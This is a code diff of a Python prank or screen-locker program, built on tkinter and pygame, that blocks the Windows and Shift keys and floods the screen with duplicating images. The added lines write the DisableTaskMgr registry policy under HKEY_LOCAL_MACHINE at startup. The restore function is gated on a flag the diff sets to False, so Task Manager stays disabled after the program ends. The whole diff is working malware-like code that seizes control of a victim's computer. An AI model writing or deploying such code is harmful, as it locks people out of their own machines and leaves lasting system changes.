@@ -4,8 +4,23 @@ from tkinter import *
 import keyboard
 from random import *
 from pygame import mixer
+import winreg as reg
 
-"""/////////////////////////////"""
+
+
+
+"""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"""
+"""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"""
+"""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"""
+
+TaskMgr = False
+
+"""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"""
+"""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"""
+"""!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"""
+
+
+
 
 keyboard.block_key('windows')
 keyboard.block_key('shift')
@@ -40,6 +55,28 @@ PNG = PNGScreen.create_image(ScreenWidth // 2, ScreenHeight // 2, image=png)
 pngs.append(PNG)
 
 """/////////////////////////////"""
+
+def DisableTaskManager():
+
+    RegPath = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+    try:
+        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, RegPath, 0, reg.KEY_SET_VALUE)
+    except FileNotFoundError:
+        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, RegPath)
+
+    reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
+    reg.CloseKey(key)
+    
+def EnableTaskManager():
+    if TaskMgr == True:
+        RegPath = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        try:
+            key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, RegPath, 0, reg.KEY_SET_VALUE)
+        except FileNotFoundError:
+            key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, RegPath)
+        reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 0)
+        reg.CloseKey(key)
+
 def Duplicate():
     global pngs
     new_pngs = []
@@ -69,8 +106,10 @@ def Moving():
 
 """/////////////////////////////"""
 
+DisableTaskManager()
 Moving()
 root.after(3000, Duplicate)
+root.after(10000, EnableTaskManager)
 root.mainloop()
 
  
